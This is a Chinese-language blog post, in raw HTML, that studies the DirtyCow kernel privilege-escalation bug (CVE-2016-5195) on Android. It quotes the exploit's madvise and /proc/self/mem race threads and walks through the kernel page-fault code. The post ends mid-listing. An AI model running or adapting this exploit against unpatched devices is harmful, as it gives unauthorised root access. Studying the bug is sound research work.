<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="cn">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">





  <meta name="keywords" content="kernel pwn,android,">










<meta name="description" content="Brief本次仍然是复现Android经典提权漏洞DirtyCow(CVE-2016-5195) DirtyCow 是一个非常经典的Linux内核提权漏洞，TIMWR团队也依据原本的漏洞原理开发了Android 版本稳定的漏洞利用。相较于PingPong Root(CVE-2015-3636) 而言，个人感觉DirtyCow更像是一个内核逻辑漏洞，对内核一些基本功底以及代码熟悉程度的要求较高。 D">
<meta name="keywords" content="kernel pwn,android">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2016-5195 DirtyCow 复现学习">
<meta property="og:url" content="http://N1rv0us@github.io/2022/09/05/CVE-2016-5195复现与分析/index.html">
<meta property="og:site_name" content="失眠想睡觉的blog">
<meta property="og:description" content="Brief本次仍然是复现Android经典提权漏洞DirtyCow(CVE-2016-5195) DirtyCow 是一个非常经典的Linux内核提权漏洞，TIMWR团队也依据原本的漏洞原理开发了Android 版本稳定的漏洞利用。相较于PingPong Root(CVE-2015-3636) 而言，个人感觉DirtyCow更像是一个内核逻辑漏洞，对内核一些基本功底以及代码熟悉程度的要求较高。 D">
<meta property="og:locale" content="cn">
<meta property="og:image" content="https://raw.githubusercontent.com/N1rv0us/N1rv0us.github.io/master/2022/09/05/CVE-2016-5195%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/2022-09-21-02-37-38-image.png">
<meta property="og:updated_time" content="2022-09-20T18:53:58.160Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2016-5195 DirtyCow 复现学习">
<meta name="twitter:description" content="Brief本次仍然是复现Android经典提权漏洞DirtyCow(CVE-2016-5195) DirtyCow 是一个非常经典的Linux内核提权漏洞，TIMWR团队也依据原本的漏洞原理开发了Android 版本稳定的漏洞利用。相较于PingPong Root(CVE-2015-3636) 而言，个人感觉DirtyCow更像是一个内核逻辑漏洞，对内核一些基本功底以及代码熟悉程度的要求较高。 D">
<meta name="twitter:image" content="https://raw.githubusercontent.com/N1rv0us/N1rv0us.github.io/master/2022/09/05/CVE-2016-5195%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/2022-09-21-02-37-38-image.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.3',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://N1rv0us@github.io/2022/09/05/CVE-2016-5195复现与分析/">





  <title>CVE-2016-5195 DirtyCow 复现学习 | 失眠想睡觉的blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="cn">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">失眠想睡觉的blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://N1rv0us@github.io/2022/09/05/CVE-2016-5195复现与分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="N1rv0us">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="失眠想睡觉的blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">CVE-2016-5195 DirtyCow 复现学习</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-09-05T19:31:09+08:00">
                2022-09-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="Brief"><a href="#Brief" class="headerlink" title="Brief"></a>Brief</h2><p>本次仍然是复现Android经典提权漏洞DirtyCow(CVE-2016-5195)</p>
<p>DirtyCow 是一个非常经典的Linux内核提权漏洞，TIMWR团队也依据原本的漏洞原理开发了Android 版本稳定的漏洞利用。相较于PingPong Root(CVE-2015-3636) 而言，个人感觉DirtyCow更像是一个内核逻辑漏洞，对内核一些基本功底以及代码熟悉程度的要求较高。</p>
<p>DirtyCow漏洞主要功能是向一个只读文件中写入任意内容，通过向Android系统中的<code>/system/bin/run-as</code> 文件写入恶意代码，达到提权的目的。</p>
<p>漏洞本身利用流程方面，首先将覆盖目标的文件以只读方式载入内存，并通过<code>/proc/$pid/mem</code>尝试对载入的目标内存中覆盖数据；同时开启另一个线程，不断通过<code>madvise(MADV_DONTNEED)</code> 系统调用释放Cowed的页面，致使获取到了真实的目标文件内存页，并完成了写入(write)操作；</p>
<h2 id="POC-与一些内核基础"><a href="#POC-与一些内核基础" class="headerlink" title="POC 与一些内核基础"></a>POC 与一些内核基础</h2><p>以TIMWR提供的exploit为参考，核心代码创建了三个线程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">exploit</span><span class="params">(struct mem_arg *mem_arg)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> pth1, pth2, pth3;</span><br><span class="line">    ...</span><br><span class="line">        LOGV(<span class="string">"[*] using /proc/self/mem method"</span>);</span><br><span class="line">        pthread_create(&amp;pth3, <span class="literal">NULL</span>, checkThread, mem_arg);</span><br><span class="line">        pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, mem_arg);</span><br><span class="line">        pthread_create(&amp;pth2, <span class="literal">NULL</span>, procselfmemThread, mem_arg);</span><br><span class="line">        pthread_join(pth3, <span class="literal">NULL</span>);</span><br><span class="line">        pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">        pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CheckThread"><a href="#CheckThread" class="headerlink" title="CheckThread"></a>CheckThread</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">checkThread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mem_arg</span> *<span class="title">mem_arg</span>;</span></span><br><span class="line">    mem_arg = (struct mem_arg *)arg;</span><br><span class="line">    LOGV(<span class="string">"[*] check thread starts, address %p, size %zd"</span>, mem_arg-&gt;offset, mem_arg-&gt;patch_size);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> * newdata = <span class="built_in">malloc</span>(mem_arg-&gt;patch_size);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; TIMEOUT &amp;&amp; !mem_arg-&gt;stop; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> f=open(mem_arg-&gt;fname, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span> (f == <span class="number">-1</span>) &#123;</span><br><span class="line">            LOGV(<span class="string">"could not open %s"</span>, mem_arg-&gt;fname);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (fstat(f,&amp;st) == <span class="number">-1</span>) &#123;</span><br><span class="line">            LOGV(<span class="string">"could not stat %s"</span>, mem_arg-&gt;fname);</span><br><span class="line">            close(f);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        read(f, newdata, mem_arg-&gt;patch_size);</span><br><span class="line">        close(f);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> memcmpret = <span class="built_in">memcmp</span>(newdata, mem_arg-&gt;patch, mem_arg-&gt;patch_size);</span><br><span class="line">        <span class="keyword">if</span> (memcmpret == <span class="number">0</span>) &#123;</span><br><span class="line">            mem_arg-&gt;stop = <span class="number">1</span>;</span><br><span class="line">            mem_arg-&gt;success = <span class="number">1</span>;</span><br><span class="line">            LOGV(<span class="string">"[*] check thread stops, patch successful, iterations %d"</span>, i);</span><br><span class="line">            <span class="keyword">goto</span> cleanup;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">100</span> * <span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    LOGV(<span class="string">"[*] check thread stops, timeout, iterations %d"</span>, i);</span><br><span class="line"></span><br><span class="line">cleanup:</span><br><span class="line">    <span class="keyword">if</span> (newdata) &#123;</span><br><span class="line">        <span class="built_in">free</span>(newdata);</span><br><span class="line">    &#125;</span><br><span class="line">    mem_arg-&gt;stop = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该线程用于检查DirtyCow的写入操作是否成功，如果已经完成对目标文件的覆盖，则将<code>mem_arg-&gt;stop</code>  设置为True，以此来终止另外的两个线程madviseThread以及procselfmemThread.</p>
<h3 id="madviseThread"><a href="#madviseThread" class="headerlink" title="madviseThread"></a>madviseThread</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mem_arg</span> *<span class="title">mem_arg</span>;</span></span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">void</span> *addr;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    mem_arg = (struct mem_arg *)arg;</span><br><span class="line">    size = mem_arg-&gt;patch_size;</span><br><span class="line">    addr = (<span class="keyword">void</span> *)(mem_arg-&gt;offset);</span><br><span class="line"></span><br><span class="line">    LOGV(<span class="string">"[*] madvise thread starts, address %p, size %zd"</span>, addr, size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(!mem_arg-&gt;stop) &#123;</span><br><span class="line">        c += madvise(addr, size, MADV_DONTNEED);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LOGV(<span class="string">"[*] madvise thread stops, return code sum %d, iterations %d"</span>, c, i);</span><br><span class="line">    mem_arg-&gt;stop = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个线程中，使用了一个特殊的syscall <code>madvise</code> , 这是一个十分危险的系统调用，它允许用户”建议”内核对某段内存做出对应的处理；manual中有如下的描述：</p>
<blockquote>
<p>The madvise() system call is used to give advice or directions to the kernel about the address range beginning at address addr and with size length bytes. Initially, the system call supported a set of “conventional” advice values, which are also available on several other implementations. (<strong>Note, though, that madvise() is not specified in POSIX.</strong>) Subsequently, a number of Linux-specific advice values have been added.</p>
<p>MADV_DONTNEED: Do not expect access in the near future. (For the time being, the application is finished with the given range, so the kernel can free resources associated with it</p>
</blockquote>
<p>在漏洞利用过程中使用的<code>MADV_DONTNEED</code> 标识会通知内核本应用在一段时间内都不会再使用某段内存。内核会因此释放掉这段内存来减轻内存资源的占用；当应用再次尝试访问被遗弃的内存时，会触发页错误并重新加载对应的内存。</p>
<h3 id="procselfmemThread"><a href="#procselfmemThread" class="headerlink" title="procselfmemThread"></a>procselfmemThread</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">procselfmemThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mem_arg</span> *<span class="title">mem_arg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fd, i, c = <span class="number">0</span>;</span><br><span class="line">    mem_arg = (struct mem_arg *)arg;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">"/proc/self/mem"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        LOGV(<span class="string">"open(\"/proc/self/mem\""</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LOOP &amp;&amp; !mem_arg-&gt;stop; i++) &#123;</span><br><span class="line">        lseek(fd, (<span class="keyword">off_t</span>)mem_arg-&gt;offset, SEEK_SET);</span><br><span class="line">        c += write(fd, mem_arg-&gt;patch, mem_arg-&gt;patch_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LOGV(<span class="string">"[*] /proc/self/mem %d %i"</span>, c, i);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    mem_arg-&gt;stop = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该线程为写入线程，但是并不是直接向目标文件尝试写操作，而是首先将目标文件以只读的方式打开并加载进入当前进程的内存中，并不断的尝试向<code>/proc/self/mem</code> 对应的内存映射区域写入内容。</p>
<p><code>/proc/{pid}/mem</code> 包含了pid对应进程的内存映射内容，以提供<code>ptrace</code> 系统调用使用，允许其他进程能够访问到pid进程的任意内存；由于该文件是一个<code>pseudo file</code>, 因此也被定义了专门的<code>file_operations</code>处理相应的文件操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from /fs/proc/base.c:</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">proc_mem_operations</span> = &#123;</span></span><br><span class="line">    .llseek  = mem_lseek,</span><br><span class="line">    .read    = mem_read,</span><br><span class="line">    .write   = mem_write,</span><br><span class="line">    .open    = mem_open,</span><br><span class="line">    .release = mem_release,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>如果<code>procselfmemThread</code>的写入尝试成功的话，目标文件就会成功被覆盖；</p>
<h2 id="漏洞原理分析与梳理"><a href="#漏洞原理分析与梳理" class="headerlink" title="漏洞原理分析与梳理"></a>漏洞原理分析与梳理</h2><p>对于一个只读文件，如果尝试进行写操作的话，正常都应该会抛出类似<code>Permission Denied</code> 的异常，由于对于<code>/proc/{pid}/mem</code> 写入操作的不正常处理，引发了漏洞，下面就将从代码梳理write函数调用后，内核对应的处理过程；</p>
<p>由<code>mem_write</code> 作为入口，将经过一系列的调用，最终到<code>__get_user_pages()</code> 函数来获取覆盖目标文件的内存页；在阅读这段代码的时候，还有一个很有意思的是，实际上读写等操作(<code>mem_read</code> , <code>mem_write</code>)，实际上的后续代码路径大体相同，只是使用的<code>FOLL_FLAG</code>回略有差异；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mm/gup.c __get_user_pages()</span></span><br><span class="line"><span class="keyword">long</span> __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">		struct vm_area_struct **vmas, <span class="keyword">int</span> *nonblocking)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* ... snip ... */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">/* ... snip ... */</span></span><br><span class="line">retry:</span><br><span class="line">		cond_resched(); <span class="comment">/* please rescheule me!!! */</span></span><br><span class="line">		page = follow_page_mask(vma, start, foll_flags, &amp;page_mask); <span class="comment">// ask for mem page here;</span></span><br><span class="line">		<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">			<span class="keyword">int</span> ret;</span><br><span class="line">			ret = faultin_page(tsk, vma, start, &amp;foll_flags,</span><br><span class="line">					nonblocking);</span><br><span class="line">			<span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">goto</span> retry;</span><br><span class="line">			<span class="keyword">case</span> -EFAULT:</span><br><span class="line">			<span class="keyword">case</span> -ENOMEM:</span><br><span class="line">			<span class="keyword">case</span> -EHWPOISON:</span><br><span class="line">				<span class="keyword">return</span> i ? i : ret;</span><br><span class="line">			<span class="keyword">case</span> -EBUSY:</span><br><span class="line">				<span class="keyword">return</span> i;</span><br><span class="line">			<span class="keyword">case</span> -ENOENT:</span><br><span class="line">				<span class="keyword">goto</span> next_page;</span><br><span class="line">			&#125;</span><br><span class="line">			BUG();</span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">if</span> (pages) &#123;</span><br><span class="line">			pages[i] = page;</span><br><span class="line">			flush_anon_page(vma, page, start);</span><br><span class="line">			flush_dcache_page(page);</span><br><span class="line">			page_mask = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">/* ... snip ... */</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">/* ... snip ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>faultin_page</code>方法来尝试获取内存页面：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">faultin_page</span><span class="params">(struct task_struct *tsk, struct vm_area_struct *vma,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">unsigned</span> <span class="keyword">long</span> address, <span class="keyword">unsigned</span> <span class="keyword">int</span> *flags, <span class="keyword">int</span> *nonblocking)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">vma</span>-&gt;<span class="title">vm_mm</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> fault_flags = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* mlock all present pages, but do not fault in new pages */</span></span><br><span class="line">	<span class="keyword">if</span> ((*flags &amp; (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)</span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line">	<span class="comment">/* For mm_populate(), just skip the stack guard page. */</span></span><br><span class="line">	<span class="keyword">if</span> ((*flags &amp; FOLL_POPULATE) &amp;&amp;</span><br><span class="line">			(stack_guard_page_start(vma, address) ||</span><br><span class="line">			 stack_guard_page_end(vma, address + PAGE_SIZE)))</span><br><span class="line">		<span class="keyword">return</span> -ENOENT;</span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_WRITE)</span><br><span class="line">		fault_flags |= FAULT_FLAG_WRITE;</span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_REMOTE)</span><br><span class="line">		fault_flags |= FAULT_FLAG_REMOTE;</span><br><span class="line">	<span class="keyword">if</span> (nonblocking)</span><br><span class="line">		fault_flags |= FAULT_FLAG_ALLOW_RETRY;</span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_NOWAIT)</span><br><span class="line">		fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;</span><br><span class="line">	<span class="keyword">if</span> (*flags &amp; FOLL_TRIED) &#123;</span><br><span class="line">		VM_WARN_ON_ONCE(fault_flags &amp; FAULT_FLAG_ALLOW_RETRY);</span><br><span class="line">		fault_flags |= FAULT_FLAG_TRIED;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = handle_mm_fault(mm, vma, address, fault_flags);  <span class="comment">// find target mem page;</span></span><br><span class="line">	<span class="keyword">if</span> (ret &amp; VM_FAULT_ERROR) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; VM_FAULT_OOM)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))</span><br><span class="line">			<span class="keyword">return</span> *flags &amp; FOLL_HWPOISON ? -EHWPOISON : -EFAULT;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		BUG();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tsk) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ret &amp; VM_FAULT_MAJOR)</span><br><span class="line">			tsk-&gt;maj_flt++;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			tsk-&gt;min_flt++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret &amp; VM_FAULT_RETRY) &#123;</span><br><span class="line">		<span class="keyword">if</span> (nonblocking)</span><br><span class="line">			*nonblocking = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> -EBUSY;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when</span></span><br><span class="line"><span class="comment">	 * necessary, even if maybe_mkwrite decided not to set pte_write. We</span></span><br><span class="line"><span class="comment">	 * can thus safely do subsequent page lookups as if they were reads.</span></span><br><span class="line"><span class="comment">	 * But only do so when looping for pte_write is futile: in some cases</span></span><br><span class="line"><span class="comment">	 * userspace may also be wanting to write to the gotten user page,</span></span><br><span class="line"><span class="comment">	 * which a read fault here might prevent (a readonly page might get</span></span><br><span class="line"><span class="comment">	 * reCOWed by userspace write).</span></span><br><span 